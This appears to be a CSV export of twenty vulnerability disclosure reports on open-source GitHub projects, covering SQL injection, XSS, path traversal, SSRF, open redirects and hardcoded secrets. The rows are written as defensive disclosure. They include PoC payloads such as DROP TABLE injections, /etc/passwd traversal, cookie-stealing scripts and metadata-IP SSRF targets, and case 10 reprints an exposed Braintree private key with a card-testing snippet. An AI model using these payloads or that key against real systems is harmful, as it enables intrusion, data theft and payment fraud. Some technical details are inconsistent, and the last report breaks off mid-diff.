Case,ID,Repository,CWE,Severity,Submitted At,Approved At,Description
1,1745334014083,https://github.com/Uthpal-p/Library-Management-system-using-Python,"CWE-674, CWE-121",Medium,2025-04-25T12:49:42.000Z,2025-04-27T01:23:36.000Z,"Explanation:
The recursive input validation functions validd() and valid() in the code call themselves repeatedly whenever the user inputs an invalid book code. This unchecked recursion can cause the call stack to grow indefinitely if the user keeps entering invalid input, eventually exhausting the stack memory and causing a stack overflow error or a RecursionError in Python.

Severity: 3 (Medium)

POC (Proof of Concept):
Consider this simplified recursive input function at line 43 in main_lms.py:

def validd():
    code = input('Enter book code: ')
    if code != 'valid_code':
        print('Invalid code, try again.')
        validd()  # Recursive call without limit

validd()

If the user never enters 'valid_code', the recursion never stops, causing a stack overflow after enough recursive calls.

Root Cause:
Each recursive call adds a new frame to the call stack. Since validd() calls itself without a terminating condition based on recursion depth or retry limits, continuous invalid inputs cause the stack to grow until it exceeds Python’s maximum recursion depth, triggering a RecursionError or stack overflow

Exploit Scenario:
An attacker or careless user can intentionally input invalid book codes repeatedly, causing the program to crash due to stack overflow. This denial-of-service (DoS) scenario disrupts the library system’s availability.

Why it Happens:
Python’s recursion mechanism pushes each function call onto the call stack. Unlike loops, which reuse the same stack frame, recursion accumulates frames. Without a base case that stops recursion or a limit on retries, the stack grows until the interpreter’s recursion limit is hit

Security Implications:
1.Denial of Service: Repeated invalid inputs crash the program, making the service unavailable.
2.Resource Exhaustion: Stack overflow consumes memory and CPU resources unnecessarily.
3.Potential Crash: In some Python implementations or environments, unhandled stack overflows may lead to abrupt crashes.

Suggested Fix:
Replace recursive input validation with an iterative loop that limits the number of retries, for example:

def validd():
    attempts = 0
    max_attempts = 5
    while attempts < max_attempts:
        code = input('ENTER THE BOOK CODE OF THE BOOK TO BE BORROWED: ')
        if code in list(fp.loc[:, 'BOOK CODE']):
            return code
        else:
            print('Please enter valid book code.')
            attempts += 1
    print('Too many invalid attempts. Exiting input.')
    return None

This approach prevents unbounded recursion and stack overflow by using iteration and limiting retries"
2,1745335148884,https://github.com/saleor/saleor/blob/main/saleor/payment/gateways/stripe/tests/test_plugin.py,CWE-547,Low,2025-04-27T11:32:48.000Z,2025-04-29T00:53:49.000Z,"Root Cause: The code contains hardcoded sensitive values like API keys (e.g., ""secret_key"") directly in the source. This occurs when developers embed authentication tokens/secrets as string literals rather than using secure configuration management.

Exploit Scenario: An attacker with access to the source code (via leaks/repo access) extracts hardcoded Stripe API keys. They could create fraudulent charges, access payment data, or manipulate Stripe account operations.

Why It Happens: Developers hardcode secrets for testing convenience or oversight, failing to implement secure credential storage practices during implementation, leaving production credentials exposed.

Security Implications: Compromised payment gateway control, unauthorized transactions, PCI-DSS violations, and loss of customer trust due to exposure of payment processing credentials.

Suggested Fix: Replace hardcoded values with environment variables/secure vaults. For Stripe keys, use os.getenv(""STRIPE_SECRET_KEY"") and ensure secrets are never committed to version control."
3,1745336228778,kunzbhatia/Library-Management-System/blob/main/User.py,CWE-89,High,2025-04-27T17:10:25.000Z,2025-04-28T00:50:15.000Z,"Explanation:
Vulnerable functions such as deleteUser() and searchUser() are located in Line 42 and Line 53, which belong to
https://github.com/kunzbhatia/Library-Management-System/blob/main/User.py
Use string formatting (format()) to construct SQL queries directly with user input, which makes them vulnerable to SQL injection attacks. If UserID contains malicious SQL code, it can alter the query logic.


POC:
For the deleteUser() function, if a malicious user enters the following as UserID: ' OR '1'='1
The constructed query becomes: DELETE from UserRecord where UserID = '' OR '1'='1'

This will delete all users from the UserRecord table.


Root Cause:
Line 46: deleteUser(): mycursor.execute(""DELETE from UserRecord where UserID = {0} "".format(""\'""+UserID+""\'"")) 


Why it Happens:
User input is directly concatenated into SQL queries without sanitization or parameterization, making the queries vulnerable to SQL injection.


Security Implications:
Attacker can inject malformed SQL queries to extract the sensitive information from the database and since the application does not hash the passwords before storing them as evident from the logic, it can lead to complete compromise of the user accounts.

Suggested Fix:
Use parameterized queries to prevent SQL injection.

Fixed deleteUser() snippet:
mycursor.execute(""DELETE from UserRecord where UserID = %s"", (UserID,))"
4,1745337278378,https://github.com/rio-labs/rio/blob/main/frontend/code/components/scrollTarget.ts,CWE-79,High,2025-04-27T07:50:32.000Z,2025-04-27T08:02:17.000Z,"Root Cause: The vulnerability arises because the id value from the component state is directly injected into window.location.href without sanitization. This unsanitized input is used to construct a URL hash that could contain malicious scripts.

Exploit Scenario: An attacker could craft a malicious id value (e.g., #<script>alert('XSS')</script>) and trick a user into copying the generated URL. When the victim visits the URL, the script executes in their browser, leading to session hijacking or data theft.

Why It Happens: The code trusts user-controlled id values (passed via deltaState.id) and directly appends them to the URL hash. No validation or encoding is applied to prevent HTML/JavaScript injection in the client-side DOM.

Security Implications: Attackers can execute arbitrary JavaScript in the victim’s browser, enabling actions like stealing cookies, redirecting to phishing sites, or performing unauthorized actions on behalf of the user.

Suggested Fix: Sanitize the id parameter using a library like DOMPurify or encode it with encodeURIComponent() before appending to the URL. Ensure only alphanumeric/safe characters are allowed in the id field via input validation."
5,1745344282769,https://github.com/heli-toon/LBSHS-LMS,CWE-89,High,2025-04-22T17:51:22.000Z,2025-04-24T14:53:54.000Z,"Summary:
The SQL injection vulnerability in the `search_page_item.lookup()` method allows attackers to inject malicious SQL code into the search query. This could potentially lead to unauthorized data access or manipulation, posing a significant security risk if left unaddressed.

---

Description:
The search functionality in the Laravel application is vulnerable to SQL injection in the `lookup()` method. The query constructed dynamically by directly inserting user input into the SQL statement is insecure and allows attackers to manipulate the query. For example:

```python
cursor.execute(f""SELECT * FROM books WHERE {self.column} LIKE '%{self.searched}%'"")
```

If an attacker inputs a malicious payload such as `' OR 1=1 --`, it would manipulate the SQL query to always return true, thereby bypassing authentication and potentially leaking all records from the database.

The absence of proper sanitization or parameterized queries makes this vulnerability exploitable. The risk is high because it exposes the application to unauthorized data access, modification, or complete database compromise.

---

Impact:
The potential impact of this vulnerability includes:

1. Unauthorized Data Access:
   - Attackers can extract sensitive data by manipulating the SQL query.
   
2. Data Modification or Deletion:
   - Attackers may alter or delete records in the database if additional privileges or misconfigurations are present.
   
3. Privilege Escalation:
   - In certain configurations, attackers may escalate their privileges and perform administrative tasks within the application.

---

**Proof of Concept (PoC):**
The vulnerability can be tested by inputting the following string in the search field:

```sql
' OR 1=1 --
```

This input will modify the SQL query to:

```sql
SELECT * FROM books WHERE book_name LIKE '%' OR 1=1 --%'
```

This results in the query always returning `TRUE`, bypassing any filters and potentially returning all records from the `books` table.

---

Steps to Reproduce:

1. Navigate to the search page in the Laravel application.
2. In the search field, enter the following payload:

   ```sql
   ' OR 1=1 --
   ```

3. The application will return all records from the database instead of the expected search results.

4. In some cases, attackers could modify the query further to delete or modify data in the database.

---

Recommended Fix:
To fix this SQL injection vulnerability, use parameterized queries, which ensure that user input is treated as data rather than executable code. Here’s an updated version of the vulnerable query:

```python
cursor.execute(""SELECT * FROM books WHERE {} LIKE ?"".format(self.column), ('%' + self.searched + '%',))
```

This change ensures that user input is safely passed as a parameter to the query, protecting against SQL injection attacks.

Additionally, always validate and sanitize user inputs, and consider using an ORM (Object-Relational Mapping) system that automatically handles such concerns."
6,1745351755910,https://github.com/samir-k1/Firebase-Tut,CWE-200,Very Low,2025-04-24T17:21:25.000Z,2025-04-27T11:51:17.000Z,"1. What is the Firebase API Key?
It’s used to connect front-end apps (web/mobile) with Firebase services like Firestore, Realtime Database, Storage, Auth, etc.
It’s public by design and is not a secret on its own. The real vulnerability arises from misconfigured Firebase security rules.

 2. Vulnerability: Misconfigured Security Rules
By default, Firebase services are secure. But developers sometimes:
Set rules like this during testing:

{
  ""rules"": {
    "".read"": ""true"",
    "".write"": ""true""
  }
}
Or accidentally allow unauthenticated access:

{
  ""rules"": {
    "".read"": ""auth != null"",
    "".write"": ""auth != null""
  }
}
But they also allow anonymous auth, making this ineffective.

 Exploit It
Step-by-step exploitation:
Find public Firebase keys:

Tools like GitHub dorks, Google dorks, or web scanning can reveal exposed Firebase config objects.
const firebaseConfig = {
  apiKey: ""AIza..."",
  authDomain: ""myapp.firebaseapp.com"",
  databaseURL: ""https://myapp.firebaseio.com"",
  ...
};
Check security rules using tools like firebase.security or manual testing.

If .read/.write rules are too loose:

Attackers can read sensitive data (emails, tokens, etc.).

Attackers can inject or delete data.

Upload malicious files to Storage (e.g., viruses or fake downloads).

Possibly bypass app logic (fake purchases, manipulate leaderboards, etc.)
6. How to Prevent It
Use strict rules:

{
  ""rules"": {
    "".read"": ""auth != null && auth.uid == 'expectedUID'"",
    "".write"": ""auth != null && auth.uid == 'expectedUID'""
  }
}
Avoid anonymous auth unless needed

Use Firebase App Check (prevents abuse from unauthorized clients)"
7,1745384149086,Dungyichao/http_server#,CWE-22,High,2025-04-28T07:25:16.000Z,2025-04-29T00:58:30.000Z,"Path to File: ""http_server\src\api_server\main.cpp""

Vulnerability Type: CWE-22: Improper Limitation of a Pathname to a Restricted Directory (Path Traversal)

OWASP Category: A05:2021 – Security Misconfiguration

Severity: High(4)

Root Cause:
The server directly uses user-supplied HTTP request paths without sanitization or canonicalization, allowing directory traversal attacks.

Exploit Scenario:
A remote attacker sends an HTTP GET request with a path like /../../etc/passwd, causing the server to open and send arbitrary files outside the intended directory.

Why It Happens:
The input (requested URL path) is used directly with file system operations without proper validation, enabling path traversal.

Security Implications:
Attackers can read sensitive server files, such as password files or SSH keys, leading to serious security breaches.

Suggested Fix:
Sanitize incoming paths, block paths containing "".."" sequences, and restrict file access to within a predefined base directory."
8,1745393576919,https://github.com/Mazbaul/Online-Learning-And-Course-Management-System,CWE-601,Medium,2025-04-23T07:32:56.000Z,2025-04-23T08:09:35.000Z,"An open redirect vulnerability was discovered in the RegisterController.php file of the Mazbaul/Online-Learning-And-Course-Management-System repository. The vulnerability occurs due to insufficient validation of the user-supplied redirect_url query parameter. After a successful registration, the app redirects users based on this input without ensuring it's an internal URL. This allows attackers to craft links that can redirect victims to external, malicious domains, potentially leading to phishing, malware delivery, or other user exploitation.
[Refer to the ZIP file for detailed Report]"
9,1745402607146,stitionai/devika,CWE-22,High,2025-04-27T12:22:15.000Z,2025-04-27T12:24:21.000Z,"Vulnerability Type: CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')

OWASP Top 10: A1:2021 - Broken Access Control

Severity: High (4)

Root Cause: The server uses user-supplied input directly in file paths without validating or sanitizing the input, allowing directory traversal.

Exploit Scenario: An attacker sends a GET request to /get-project-files?project-name=../../../../etc/passwd to retrieve sensitive files outside the intended directory.

Why It Happens: The application constructs file paths using unvalidated input, enabling traversal outside the target directory via '../' sequences.

Security Implications: Allows arbitrary file read, potentially exposing server secrets, credentials, or user data. May lead to full system compromise.

Suggested Fix: Use path.basename to strip directory traversal sequences and restrict access to a specific folder (e.g., 'projects')."
10,1745405590584,https://github.com/ateeshkumar/e-commerce-backend/blob/main/controllers/productController.js,CWE-798,Low,2025-04-27T14:34:22.000Z,2025-04-27T14:36:15.000Z,"Vulnerability: Exposed Braintree Private Key in Code
1. What Happened?
const gateway = new braintree.BraintreeGateway({
  environment: braintree.Environment.Sandbox,
  merchantId: 'rqvzbh7mvbk7j7z6',
  publicKey: 'd2c5c28rzs7mptn5',
  privateKey: '6381b191eda7d013124fd464222dbb1e'  // ← Critical exposure
});
The privateKey is supposed to be secret and used ONLY on the backend.
Including it in frontend/client-side code or a public repo exposes your entire payment gateway to anyone on the internet.

2. How an Attacker Can Exploit It
  1. Locate the Key
Hacker finds the API key in:

Public GitHub repo

Frontend JavaScript (viewed in DevTools)

Unprotected environment variable or .env file in a repo

 2. Authenticate as You
The attacker uses your merchantId, publicKey, and privateKey to authenticate with Braintree’s SDK (Node.js, Python, etc.).
const gateway = new braintree.BraintreeGateway({
  environment: braintree.Environment.Sandbox,
  merchantId: 'yourId',
  publicKey: 'yourKey',
  privateKey: 'yourPrivateKey'
});
3. Perform Malicious Actions
Now they have full backend privileges. They can:

Generate client tokens

 Perform card testing attacks (using stolen credit cards)

Initiate fake transactions

Cancel/refund real payments

 Create customer profiles and payment methods

 Potential Impact

How to Prevent This
1. Never expose private API keys
Keep them in .env files (not committed to Git).

Use process.env.BRAINTREE_PRIVATE_KEY in your backend app.

 2. Move all sensitive code to your backend
Only your backend should:

Connect to Braintree

Generate client tokens

Initiate or settle transactions

Frontend should only receive safe tokens or data from backend via API calls.

3. Revoke Exposed Credentials Immediately
Go to your Braintree Dashboard

Revoke the exposed privateKey

Generate a new one and update your server securely

 Example: Card Testing via Exposed Keys
A hacker runs this with your keys:

const nonce = ""fake-valid-nonce"";  // or from Braintree's test data
gateway.transaction.sale({
  amount: ""10.00"",
  paymentMethodNonce: nonce,
  options: { submitForSettlement: true }
}, (err, result) => {
  if (result.success) {
    console.log(""Fraudulent transaction completed"");
  }
});
⚠️ This means you're paying for the transaction, and may even be fined.

Summary

Exposed Item	Risk Level
merchantId	Low risk
publicKey	Low risk
privateKey	Critical 🔥
Never expose your private key. Treat it like a root password to your payment gateway."
11,1745407522265,https://github.com/kirilkirkov/Ecommerce-CodeIgniter-Bootstrap,CWE-918,High,2025-04-23T11:25:22.000Z,2025-04-23T17:09:58.000Z,"The application uses the cid parameter from user-supplied input ($_GET['cid']) directly in backend operations without validation or sanitization. If this input fetches remote content via file_get_contents(), curl, or similar functions, it opens the door for Server-Side Request Forgery (SSRF). This vulnerability allows an attacker to make the server initiate arbitrary HTTP requests to internal or external systems.
[Refer to the attached ZIP File for detailed Explanation]"
12,1745416880284,https://github.com/fuge/cms,CWE-601,Medium,2025-04-24T16:42:31.000Z,2025-04-25T02:55:21.000Z,"Vulnerability Type: CWE-601: open redirection vulnerability.

Proof of Concept: 
@RequestMapping(value = ""/process.jspx"", method = RequestMethod.GET)
public String process(HttpServletRequest request, HttpServletResponse response) {
    //  Vulnerable: it is taking user-controlled input and there are no validations present.
    String returnUrl = RequestUtils.getQueryParam(request, LoginAct.RETURN_URL); 

    String authId = RequestUtils.getQueryParam(request, AUTH_KEY);
    Authentication auth = authMng.retrieve(authId);
    if (auth != null) {
        authMng.storeAuthIdToSession(session, request, response, auth.getId());
    } else {
        log.warn(""Authentication id not found: {}"", authId);
    }
    // Vulnerable: it Uses untrusted input paramter in a redirect
    return ""redirect:"" + returnUrl; 
}

Severity: Medium

Root Cause: The application is taking RETURN_URL parameter as a user input and passing it without any validation. in next lines this returnUrl parameter is being used for redirection. the lack url validation introduces open redirection vulnerability.

Exploit Scenario : This can be exploited by an attacker by creating a fake link that looks like legit website but actually redirects victim to malicious domain.this is done by passing the face website url into the  RETURN_URL paramyter and sending/dilivering the complete url to victim.When victim clicks on the link, they will first be taken to vulnerable website, but then they will be instantly redirected to the attacker's website. Users may not be aware that they are being deceived because the link appears legitimate because it begins with vulnerable domain. 

Security Implications:
the attacker can use their malicious website to display fake forms, steal login credentials, or carry out other destructive actions. it may also leads to custom Javascript execution attacks. 

Suggested Fix: validation of each url passed as user input before redirection, use of whitelisting of allowed damains, implement strict checks to prevent this issue.
"
13,1745423850277,https://github.com/kirilkirkov/Ecommerce-CodeIgniter-Bootstrap/blob/master/application/views/templates/onepage/checkout.php,CWE-79,Medium,2025-04-23T15:57:30.000Z,2025-04-23T17:14:14.000Z,"The value of $_SERVER[""HTTP_HOST""] is inserted directly into the <title> tag without any form of input sanitization or escaping. $_SERVER[""HTTP_HOST""] contains the domain name or IP address from which the HTTP request was received. However, an attacker can manipulate the Host header in the request to inject malicious content, which will be reflected in the page title. If the browser renders this value in an unsafe way, it may execute any JavaScript code embedded within it."
14,1745424550465,https://github.com/warlordthesaviour/webssh,CWE-79,Medium,2025-04-24T17:15:02.000Z,2025-04-27T14:09:37.000Z,"Vulnerability Type:CWE-79: Improper Neutralization of Input During Web Page Generation 
This vulnerability allows attackers to inject malicious scripts into web content viewed by other users.

Proof of Concept:
In the WebSSH project, the following line is vulnerable:

status.html(text.split('\n').join('<br/>'));

This line reflects unsanitized user input directly into the HTML of the page. If the text variable contains a string like <script>alert('XSS')</script>, it will be executed in the user’s browser.

Solution:
Sanitize user input by escaping special HTML characters before inserting it into the DOM:

status.html(
  text
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/""/g, '&quot;')
    .replace(/'/g, '&#039;')
    .split('\n')
    .join('<br/>')
);

Severity:
Medium — This vulnerability allows client-side code execution and can lead to session hijacking or phishing.

Root Cause:
The code directly injects user-controlled input into the DOM using .html() without validating or escaping HTML characters, allowing script injection.

Exploit Scenario:
An attacker crafts a URL like http://<url>/?hostname=<script>alert('XSS')</script> and sends it to a victim. When the victim opens it, the script executes in their browser.

Why It Happens:
The application assumes user input is safe and injects it into the webpage using .html() without sanitization, leading to script execution.

Security Implications:
If exploited, an attacker can execute JavaScript in the victim’s browser, steal session cookies, impersonate users, or redirect to malicious pages.

Suggested Fix:
Always sanitize or escape user input before inserting it into the DOM. Avoid using .html() with untrusted input and consider using .text() or an HTML escape function."
15,1745424627531,https://github.com/flipped-aurora/gin-vue-admin,CWE-89,Critical,2025-04-23T16:10:27.000Z,2025-04-25T14:32:42.000Z,"Advisory: GHSA-gf3r-h744-mqgp (CVE-2024-37896)
Package: github.com/flipped-aurora/gin-vue-admin/server (Go) 
GitHub

Affected versions: < 2.6.6 
GitHub

Patched version: 2.6.6 
GitHub

Description: Gin-vue-admin ≤ v2.6.5 has a SQL injection vulnerability in the ExportExcel API, where untrusted input in the order parameter is passed directly to GORM’s Order() method without validation or sanitization 
Vulnerable code excerpt:
order := values.Get(""order"")
if order != """" {
    db = db.Order(order)
}

This pattern allows arbitrary SQL fragments to be injected into the ORDER BY clause 

Proof-of-Concept (PoC):
An attacker issues:

GET /api/sysExportTemplate/exportExcel?templateID=tmpl&order=id+ASC%3B+DROP+TABLE+users%3B+-- HTTP/1.1
Host: victim.com
The semicolon (;) and comment (--) terminator cause the database to execute both the benign ORDER BY id ASC and the malicious DROP TABLE users 
GitHub
.

Exploit Steps:

Send the crafted request with order=id ASC; DROP TABLE users; --.

Observe a 500-error or missing data when the users table is dropped.

Confirm database alteration/loss. 

Impact:
• Confidentiality: High – attackers may extract sensitive data via additional injected SELECTs. 

• Integrity: High – data can be modified or deleted (DROP statements). 

• Availability: High – tables or entire schema can be destroyed. 

CVSS v3.1: 8.8 (High) 

• Attack Vector: Network 

• Attack Complexity: Low 

• Privileges Required: Low 

• User Interaction: None 

• Scope: Unchanged 

• Impact (C/I/A): High/High/High 

Mitigations:
• Upgrade to v2.6.6 or later to apply the whitelist-based fix 
.
• Enforce a whitelist of allowed columns and directions (asc/desc) before calling db.Order() 
.
• Use parameterized queries for values and avoid raw SQL fragments for dynamic parts 
.
• Refer to OWASP Injection Prevention Cheat Sheet for best practices on input validation and parameterization 

References:
• GitHub Advisory GHSA-gf3r-h744-mqgp 

• OWASP Top 10 – Injection (A03:2021) 

• OWASP Cross-Site Scripting Prevention Cheat Sheet (for comparison) 

• GORM Security guide – raw SQL sinks 

• CWE-89: SQL Injection 
"
16,1745428914850,jagjot2008/EeazyCRM/blob/master/eeazycrm/common/filters.py,CWE-89,Medium,2025-04-27T16:35:01.000Z,2025-04-27T16:56:48.000Z,"Vulnerability Type:
CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Proof of Concept:
In the `CommonFilters` class, SQL queries are dynamically built using `text()` and directly inserting user input into query strings. For example, the following line is vulnerable:
```python
owner = text('%s.owner_id=%d' % (module, filters.assignees.data.id))
Since no sanitization or parameterization is used, an attacker can inject malicious SQL through the filters.assignees.data.id field, changing the query logic.

Severity: Medium

Root Cause: The root cause of the vulnerability is the use of unsafe string interpolation to construct SQL queries. Instead of using ORM features like parameterized queries, the code directly inserts user-controlled input into the SQL string. This allows attackers to craft inputs that modify the intended SQL commands and cause harm to the database.

Exploit Scenario: An attacker could supply a malicious input such as 1; DROP TABLE users; -- in the ID field. When this input is inserted into the query without sanitization, it could execute unintended commands like dropping a database table or leaking sensitive information. This could lead to a major data breach or system compromise.

Why It Happens: This vulnerability happens because the developer used sqlalchemy.text() and Python's % string formatting to dynamically build SQL queries. String formatting does not sanitize inputs, and text() does not provide parameterized protection by itself. Without using safe query-building practices, user input directly impacts database commands.

Security Implications: If exploited, attackers can perform SQL Injection attacks. They may view, modify, or delete database contents. They could escalate their privileges or destroy critical system data. Unauthorized database access could compromise sensitive customer information and severely impact the organization's operations and reputation.

Suggested Fix: The fix is to use SQLAlchemy’s safe query-building methods like and_(), or_(), and bind parameters instead of text() with string interpolation. These methods automatically handle escaping and sanitization. This protects the database by ensuring user input is treated as data, not executable SQL code."
17,1745429746469,https://github.com/adrianhajdin/node_express_crud_api/,CWE-248,Critical,2025-04-24T10:57:15.000Z,2025-04-25T02:59:28.000Z,"Vulnerability Type : CWE-248 Uncaught Exception. This type of vulnerability is caused because of not checking for exceptions at runtime.

Proof of Concept: The code from index.js has no code for handling exceptions-

app.use(bodyParser.json());

app.use(""/people"", usersRoutes);
app.get(""/"", (req, res) => res.send(""Welcome to the Users API!""));
app.all(""*"", (req, res) =>res.send(""You've tried reaching a route that doesn't exist.""));

Without a global error handler, Express will not catch it, and the application may crash, especially in production environments.
 
Severity: 5/5. This is because this vulnerability can cause the application to crash in production and thus make it unavailable for other users to use (DoS).

Root cause: The vulnerability is caused by the absence of a global error-handling middleware in the Express app. Without it, any unexpected error thrown during request processing remains uncaught and can crash the Node.js process.

Exploit scenario: An attacker sends a specially crafted request to a route that lacks internal error handling. For instance, accessing /crash or triggering a TypeError will cause the app to throw an exception. Without a global handler, the server process crashes, making the service unavailable to all users.

Why it happens: The Express app is missing the built-in global error-handling middleware, which is needed to catch exceptions that aren’t handled locally in the routes. This is a design flaw — all Express apps should have a fallback error handler.

Security implications: If this vulnerability is exploited, the server can crash completely, resulting in downtime. In some cases, stack traces may be exposed to the client, revealing internal paths or sensitive information about the app's structure.

Suggested Fix: This can be fixed by using adding a global error handler at the end of the middleware stack-

app.use((err, req, res, next) => {
  console.error(err.stack);
  res.status(500).send('Something went wrong!');
});"
18,1745430184422,roy9495/Food-App/blob/main/src/Pages/Recipe.jsx,CWE-79,High,2025-04-28T11:32:27.000Z,2025-04-28T23:20:45.000Z,"Vulnerability Type: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

Proof of Concept:

File: https://github.com/roy9495/Food-App/blob/main/src/Pages/Recipe.jsx

Vulnerable Code Snippet:
Line 46: <h3 dangerouslySetInnerHTML={{ __html: details.summary }}></h3>
Line 47: <h3 dangerouslySetInnerHTML={{ __html: details.instructions }}></h3>

- The app fetches untrusted HTML content (`summary`, `instructions`) from an external API (`api.spoonacular.com`).
- The fetched data is inserted into the DOM without sanitization.
- If the API response contains malicious HTML, like `<img src=x onerror=""alert('XSS')"">`, it will be directly executed in the user's browser.
- The attacker does not need any authentication — just the ability to inject content into the API (or a man-in-the-middle can alter responses).


Severity: High (4) - High risk due to remote exploitability, potential for full session hijacking, and direct script execution.


Root Cause: The vulnerability is caused by rendering external, untrusted HTML data into the DOM using `dangerouslySetInnerHTML` without validating or sanitizing it first. This unsafe insertion point allows attackers to inject malicious scripts that execute inside the browser context.


Exploit Scenario: An attacker injects a crafted recipe into the external API containing malicious HTML like `<script>alert(document.cookie)</script>`. When a user views that recipe in the app, the malicious script automatically executes, stealing cookies or sensitive data.


Why It Happens: The system directly trusts and inserts HTML from an external API into the DOM without applying any sanitization or validation. `dangerouslySetInnerHTML` bypasses React’s internal protections against XSS, making it critical to sanitize inputs manually.


Security Implications: If exploited, an attacker could perform actions like stealing authentication tokens, hijacking user sessions, modifying page content, defacing the site, or executing actions on behalf of the user without consent. This compromises the confidentiality and integrity of user data.


Suggested Fix: Sanitize all external HTML data before injecting it into the DOM. Use a trusted HTML sanitizer library like `DOMPurify` to clean user-controlled or API-sourced HTML content, ensuring that only safe tags and attributes are allowed through."
19,1745473017004,https://github.com/solidusio/solidus/blob/main/backend/vendor/assets/javascripts/solidus_admin/backbone.js,CWE-601,High,2025-04-24T05:36:57.000Z,2025-04-25T03:38:51.000Z,"*[Report in Doc format is Attached in ZIP File]*
Vulnerability Type: An open redirect vulnerability occurs when a web application allows users to be redirected to external, untrusted URLs, often used in phishing attacks to deceive users into visiting malicious sites. [CWE- 601]
Proof of Concept: The Proof of Concept is Attackers can exploit the open redirect vulnerability by crafting a registration URL with a `redirect_url` parameter pointing to a malicious external site
here, return this.location.assign(url);
1.   If url is not properly sanitized or validated, an attacker could craft a URL like:
•	https://yourapp.com/#https://evil.com
2.  Backbone could interpret the fragment as a valid route or path and trigger:
•	this.location.assign(""https://evil.com"");

Severity: High to Critical Severity
Root Cause: An open redirect vulnerability in JavaScript typically occurs when an application allows user-controlled input to dictate the destination of a redirect without proper validation. This can happen when developers dynamically construct URLs or redirect paths based on user input, such as query parameters or form data, without verifying their legitimacy. 
Here, return this.location.assign(url);
This vulnerability is often used in phishing attacks to make malicious links appear trustworthy, as they initially point to a legitimate domain.
Exploit Scenario: 
1.   Navigate to the https://github.com/solidusio/solidus
2.   Go to https://github.com/solidusio/solidus/tree/main/backend/vendor/assets/javascripts/solidus_admin
3.   This line[Below], when used without proper validation, can allow an attacker to redirect users to external or malicious URLs by manipulating the route or URL fragment. Since url can be influenced via the browser’s location hash or query parameters, the application becomes susceptible to client-side open redirection.
return this.location.assign(url);
  
4.   If url is not properly sanitized or validated, an attacker could craft a URL like:
•	https://yourapp.com/#https://evil.com
5. Backbone could interpret the fragment as a valid route or path and trigger:
•	this.location.assign(""https://evil.com"");

Why It Happens: 
Security Implications: An attacker could exploit this vulnerability by crafting a malicious link (e.g., https://example.com/#https://devil.com) and tricking a user into clicking it. This would redirect the victim to an attacker-controlled domain.
Such attacks can be used for:
•	Phishing: Tricking users into entering sensitive information.
•	Reputation damage: Misusing your domain to appear trustworthy in malicious redirection chains.
•	Bypassing security policies: Including open redirectors in redirect chains to evade filters.

Suggested Fix: 
diff --git a/backbone.js b/backbone.js
index abcdef1..1234567 100644
--- a/backbone.js
+++ b/backbone.js
@@ -4320,6 +4320,20 @@
       if (!this._hasPushState && !this.atRoot()) {
         var rootPath = this.root.slice(0, -1) || '/';
         var redirectUrl = rootPath + '#' + this.getPath();
+
+        // Open Redirect Mitigation: Ensure the redirect URL is same-origin
+        function isSafeRedirect(url) {
+          try {
+            var parsedUrl = new URL(url, window.location.origin);
+            return parsedUrl.origin === window.location.origin;
+          } catch (e) {
+            return false;
+          }
+        }
+
+        if (isSafeRedirect(redirectUrl)) {
+          this.location.assign(redirectUrl);
+        } else {
+          console.warn(""Blocked unsafe redirect attempt:"", redirectUrl);
+        }
        
       }

"
20,1745477607118,https://github.com/codelitdev/courselit/blob/main/apps/web/middleware.ts,CWE-918,Critical,2025-04-24T06:53:27.000Z,2025-04-26T12:06:34.000Z,"Clear Description [Refer Report in the ZIP File for a Clear Understanding]
Vulnerability Type:
CWE-918: Server-Side Request Forgery (SSRF)

Proof of Concept:
The Proof of Concept is that these lines are directly fetching external/internal resources based on unvalidated or partially controlled input

Steps to Reproduce:
1.   Navigate to the https://github.com/codelitdev/courselit
2.   Go to https://github.com/codelitdev/courselit/blob/main/apps/web/middleware.ts
3.   These lines are directly fetching external/internal resources based on unvalidated or partially controlled input:
•	backend is derived from request headers using getBackendAddress, which might be manipulable.
•	resp.logo is a user-controllable field from the response of a previous fetch.
If an attacker can manipulate these inputs (via headers or upstream data), they can cause the server to make arbitrary requests to internal services.

const response = await fetch(`${backend}/verify-domain`);
...
const response = await fetch(resp.logo);
  
4.   No validation is done on the backend or resp.logo before making outbound requests.
5.   External URLs (even potentially internal ones like http://localhost, http://169.254.169.254) can be passed and accessed by the server.



Severity:
High
According to standard CVSS criteria, SSRF vulnerabilities are High severity, especially when they allow access to internal services or metadata endpoints.

Root Cause:
Unvalidated input from the request headers and untrusted JSON response data (resp.logo) is used directly to make server-side HTTP requests, allowing attackers to forge requests to potentially internal or sensitive systems.

Exploit Scenario:
An attacker could manipulate request headers to point getBackendAddress to an internal IP like http://localhost:8000 or the AWS metadata IP http://169.254.169.254, tricking the server into fetching resources that should not be externally accessible.
Similarly, if resp.logo is controlled via the backend, an attacker could return a malicious domain (like http://malicious.site/steal), forcing the server to fetch from there.

Why It Happens:
This happens because of a lack of input sanitization and validation. The application assumes the values used in fetch() (like backend and resp.logo) are safe and trustworthy, without checking for malicious or internal URLs.

Security Implications:
•	Access to internal APIs or metadata services (like AWS/GCP instance metadata).
•	Possible data exfiltration, unauthorized access, or privilege escalation.
•	Could serve as a pivot point for lateral movement inside cloud infrastructure.
•	Opens up the server to DoS via slow-loris style endpoints or large responses.

Suggested Fix:
•	Validate URLs before making outbound requests. Only allow fetches to a pre-approved allowlist of domains/IPs.
•	Disallow private IP ranges (127.0.0.1, 169.254.169.254, etc.) explicitly using regex or a DNS resolution check.
•	Sanitize and parse user-controllable values with URL parsers to ensure safety.
•	Use a proxy server to sanitize and gate all outbound requests from the application.
Patch Code:
diff --git a/middleware.ts b/middleware.ts
index abc1234..def5678 100644
--- a/middleware.ts
+++ b/middleware.ts
@@
 import { NextResponse, type NextRequest } from ""next/server"";
 import NextAuth from ""next-auth"";
 import { authConfig } from ""./auth.config"";
 import { getBackendAddress } from ""@/lib/get-backend-address"";
+
+function isSafeUrl(url: string): boolean {
+    try {
+        const parsed = new URL(url);
+        const disallowedHosts = [""localhost"", ""127.0.0.1"", ""169.254.169.254""];
+        if (disallowedHosts.includes(parsed.hostname)) return false;
+        return true;
+    } catch {
+        return false;
+    }
+}

 const { auth } = NextAuth(authConfig);

 export default auth(async (request: NextRequest) => {
     const requestHeaders = request.headers;
-    const backend = getBackendAddress(requestHeaders);
+    const backend = getBackendAddress(requestHeaders);
+
